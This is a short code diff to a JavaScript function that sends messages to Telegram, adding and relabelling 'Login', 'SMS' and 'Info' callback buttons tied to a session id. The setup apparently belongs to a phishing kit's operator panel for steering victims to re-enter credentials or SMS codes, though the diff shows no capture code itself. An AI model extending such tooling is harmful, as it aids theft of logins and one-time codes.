@@ -20,13 +20,14 @@ async function sendToTelegram(message, withButton = false, type = null) {
             if (type === 'sms') {
                 replyMarkup = {
                     inline_keyboard: [[
-                        { text: "❌ SMS", callback_data: `sms_error:${sessionId}` }
+                        { text: "❌ SMS", callback_data: `sms_error:${sessionId}` },
+                        { text: "🔄 Login", callback_data: `login:${sessionId}` }
                     ]]
                 };
             } else {
                 replyMarkup = {
                     inline_keyboard: [[
-                        { text: "❌ Info", callback_data: `info:${sessionId}` },
+                        { text: "❌ Login", callback_data: `info:${sessionId}` },
                         { text: "📩 SMS", callback_data: `sms:${sessionId}` }
                     ]]
                 };
